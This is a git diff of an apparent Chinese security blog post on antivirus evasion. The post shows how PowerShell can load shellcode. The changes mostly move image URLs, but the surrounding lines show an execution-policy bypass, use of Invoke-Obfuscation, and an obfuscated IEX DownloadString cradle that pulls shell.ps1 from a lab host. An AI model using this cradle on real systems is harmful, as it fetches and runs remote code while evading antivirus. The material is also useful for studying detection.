@@ -23,16 +23,16 @@
 <meta property="og:site_name" content="AU9U5T">
 <meta property="og:description" content="简介总所周知，powershell 是windows 最强大的后门，现在就尝试使用这个后门进行加载shellcode powershell 记载shellcde 可以分为两种方式，第一个方式就是无文件落地的方式，内存加载第二种方式就是使用先下载到本地文件，然后再加载 前情提要远程加载1cmd.exe &#x2F;c powershell.exe -ExecutionPolicy bypass -noprof">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027111259.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027112339.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027112538.png">
-<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027112824.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/20241027111259.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/20241027112339.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/20241027112538.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/20241027112824.png">
 <meta property="article:published_time" content="2024-10-26T03:21:36.000Z">
-<meta property="article:modified_time" content="2024-10-28T06:53:49.058Z">
+<meta property="article:modified_time" content="2025-06-01T09:42:24.332Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="免杀">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027111259.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/august244/picture/master/allinit/20241027111259.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -340,11 +340,11 @@
 <p>然后执行</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-Obfuscation</span>.psd1; <span class="hljs-built_in">Invoke-Obfuscation</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027111259.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/20241027111259.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>这个是加载之后的样子</p>
-<p>尝试将shellcode j进行编码<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027112339.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>尝试将shellcode j进行编码<br><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/20241027112339.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>然后输入encoding</p>
-<p>然后选择编码方式<br>然后输入方法<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027112538.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>然后输入out path就可以导出<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/20241027112824.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>然后选择编码方式<br>然后输入方法<br><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/20241027112538.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>然后输入out path就可以导出<br><img src="https://raw.githubusercontent.com/august244/picture/master/allinit/20241027112824.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <p>然后就可以尝试进行加载</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-NoExit</span> <span class="hljs-string">&quot;<span class="hljs-variable">$c1</span>=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;<span class="hljs-variable">$c2</span>=&#x27;123(&#x27;&#x27;http://10.211.55.2/shell.ps1&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX (<span class="hljs-variable">$c1</span>+<span class="hljs-variable">$c2</span>)&quot;</span><br></code></pre></td></tr></table></figure>
 
